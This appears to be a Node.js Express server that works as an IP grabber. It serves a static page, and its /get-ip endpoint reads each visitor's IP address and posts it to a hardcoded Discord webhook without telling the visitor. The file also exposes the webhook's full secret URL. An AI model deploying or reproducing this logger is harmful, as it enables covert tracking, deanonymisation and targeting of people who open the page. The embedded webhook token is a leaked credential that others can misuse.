const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

const webhookUrl = 'https://discord.com/api/webhooks/1331566029905592371/zKbUgWT9pKCr-6GyEfxv5yO3gkMqEdoaJR9M2ujz2PakDJNneiwHtFnYid0oZpHjrEQ5';

app.use(express.static('public')); // Serve the HTML page

// Endpoint to fetch and send IP address
app.get('/get-ip', (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;  // Get the IP address

    // Send the IP to Discord Webhook
    axios.post(webhookUrl, {
        content: `User IP Address: ${userIP}`,
    })
    .then(() => {
        res.json({ success: true });
    })
    .catch(err => {
        console.error('Error sending to Discord:', err);
        res.json({ success: false });
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
